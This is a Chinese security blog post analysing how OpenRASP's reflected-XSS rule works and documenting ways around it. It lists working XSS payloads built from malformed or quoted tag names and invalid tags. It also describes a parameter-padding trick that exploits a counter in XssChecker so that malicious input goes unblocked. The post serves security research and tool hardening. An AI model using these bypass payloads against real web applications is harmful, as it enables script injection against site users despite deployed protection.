# OpenRASP xss算法的几种绕过方法

阅读量 **180753**

|评论 **1**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-07-21 14:30:43

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p3.ssl.qhimg.com/t012b1bfb13be0028d0.png)

openrasp默认只能检测反射型XSS，存储型XSS仅IAST商业版支持。对于反射型xss，openrasp也只能检测可控输出点在html标签外的情况，本文的绕过方法是针对这种情况。如果可控输出点在html标签内，如`<input
type="text" value="$input">`或`<script>...</script>` 内部，openrasp几乎检测不到。

## 测试环境

windows / tomcat / jdk1.8 / openrasp 1.3.7-beta

测试环境部署参见<https://www.anquanke.com/post/id/241107>，或者官网文档。

在official.js中xss_userinput算法默认配置为ignore，修改为block来开启拦截。此时点击官方测试用例中下面链接，即可触发openrasp拦截。

![](https://p3.ssl.qhimg.com/t01356f49ca51bf9ffe.png)

![](https://p5.ssl.qhimg.com/t01940339fb313fdf9b.png)

## openrasp xss算法

openrasp
xss算法有2种。算法1是针对PHP环境，此处不考虑。算法2是用户输入匹配算法，根据注释说明，算法原理是”当用户输入长度超过15，匹配上标签正则，且出现在响应里，直接拦截”。

![](https://p0.ssl.qhimg.com/t0136744832f3ec0696.png)

标签正则含义使用regexper网站解析如下

![](https://p0.ssl.qhimg.com/t01af305b14a63132a6.png)

标签正则从整体上来说匹配两种情况，一是请求参数值中有子字符串以`<!` 开头的；二是请求参数值中有子字符串以`<`
开头的。对于第二种情况，标签正则会匹配`<` 字符后接1到12个大小写字母，再后接`/` 或`>` 或`0x00 - 0x20`
字符的字符串。所以下面这些常见的xss测试payload都会拦截。

    
    
    <script>alert(1)</script>         // "<script>"部分匹配标签正则
    <img src=1 onerror=alert()>       // "<img "部分匹配正则，空格符对应正则中0x20
    <svg/onload=alert()>              //  "<svg/"部分匹配正则
    

`<img src=1 onerror=alert()>`触发拦截

![](https://p4.ssl.qhimg.com/t014936125b67fb01b8.png)

## 标签正则绕过

整理网上的一些xss 绕过payload，发现下面这些可以顺利绕过标签正则

    
    
    <d3v/onmouseleave=[1].some(confirm)>click
    <d3/onmouseenter=[2].find(confirm)>z
    <d3"<"/onclick="1>[confirm``]"<">z
    <w="/x="y>"/ondblclick=`<`[confir\u006d``]>z
    

浏览器直接输入上面那些xss payload会报400响应错误。对payload进行url编码所有字符。

![](https://p2.ssl.qhimg.com/t018840de1306ca138e.png)

burpsuite repeater中右键”copy url”，复制url到浏览器中访问，点击即可触发弹框。

![](https://p4.ssl.qhimg.com/t011fbad0a21551c801.png)

###  标签后接单双引号

收集过程中还发现下面这两种xss payload也可以绕过。

    
    
    <a"/onclick=(confirm)()>click 
    <a'/onclick=(confirm)()>click
    

简单测了下其他标签后接单引号或双引号进行绕过，好像蛮多都行的。

    
    
    <button onclick=alert()>12</button>    // 拦截
    <button' onclick=alert()>12</button>   // 点击弹框
    <button" onclick=alert()>12</button>   // 点击弹框
    <div onclick=alert()>12</div>          // 拦截
    <div' onclick=alert()>12</div>         // 点击弹框
    <div" onclick=alert()>12</div>         // 点击弹框
    

例如，使用`123<img' src=1 onclick=alert()>123` ，url编码后，点击也能弹框。

![](https://p1.ssl.qhimg.com/t01a647ed530b4d24f9.png)

###  构造无效标签

这种也可以用于绕过openrasp。看到这种绕过方式，感觉前面的都不香了。

![](https://p3.ssl.qhimg.com/t0164f0fc49f94ded5e.png)

只要构造如下payload即可

    
    
    <abc1 onclick=confirm()>click here   // 标签名是字母+数字
    

验证如下

![](https://p5.ssl.qhimg.com/t0114f6e8a35ad706fc.png)

或者

    
    
    <abcdefabcdefa onclick=confirm()>click here   // 标签名称长度大于12
    

![](https://p4.ssl.qhimg.com/t019a8c1820a9f4a76d.png)

## 程序逻辑绕过

还有一种绕过方法，是从程序检测逻辑上进行绕过。

openrasp
xss具体检测代码实现在这个文件中`agent/java/engine/src/main/java/com/baidu/openrasp/plugin/checker/local/XssChecker.java`。下面的一段代码是对”当用户输入长度超过15，匹配上标签正则，且出现在响应里，直接拦截”的具体实现。

![](https://p1.ssl.qhimg.com/t014e85bbfecb259241.png)

但代码中多了一处逻辑。如果请求会传递多个参数，当某个参数值长度大于15，且匹配之前的标签正则`<![\-\[A-Za-z]|<([A-Za-z]{1,12})[\/\x00-\x20>]`
，如果对应参数值没有在响应中出现时，变量count值会加1。当count值大于10时，openrasp会直接放行。控制程序运行到上面图片中第二个方框中即可产生绕过。

###  绕过演示

此处为了查看payload内容方便，使用了post请求。如果转换成get请求，并对参数值url编码，效果一样。

原始请求会触发拦截

![](https://p0.ssl.qhimg.com/t0159aca56387091f9d.png)

绕过payload。在input参数前面添加多个input[n]的参数，且参数值为其他xss payload。

![](https://p2.ssl.qhimg.com/t01f0d25049eabe8618.png)

转换成get请求，并对payload进行编码。

![](https://p1.ssl.qhimg.com/t01f387d753c363ba30.png)

###  绕过payload分析

构造的绕过payload有几点要求。一是，虚构的请求参数理论上至少要有11个，如前面input0到input11请求参数。如果没成功，最好在增加几个请求参数。二是，虚构的请求参数名取值有些要求。三是，虚构的请求参数值不能与真实请求参数值相同。

因为这样的话，input0到input11这些请求参数在`parameterMap` 中会排在input参数前面，见下图。

![](https://p4.ssl.qhimg.com/t01a7ace01a2b6f2703.png)

这样input0到input11这些参数就会优先input请求参数被openrasp检测逻辑处理，从而击中`count >
exceedLengthCount` 的条件进行绕过。

## 参考资料

[https://github.com/s0md3v/AwesomeXSS#awesome-tags—event-handlers](https://github.com/s0md3v/AwesomeXSS#awesome-tags--event-handlers)

<https://www.anquanke.com/post/id/173701>

<https://www.yuque.com/pmiaowu/web_security_1/scwgqm#JFw3a>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **mattF123** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/247612](/post/id/247612)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [xss](/tag/xss)
  * [OpenRASP](/tag/OpenRASP)
  * [waf](/tag/waf)

 **+1** __3赞

 __收藏

![](https://p4.ssl.qhimg.com/t010d6b38e549cb8493.png) mattF123

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

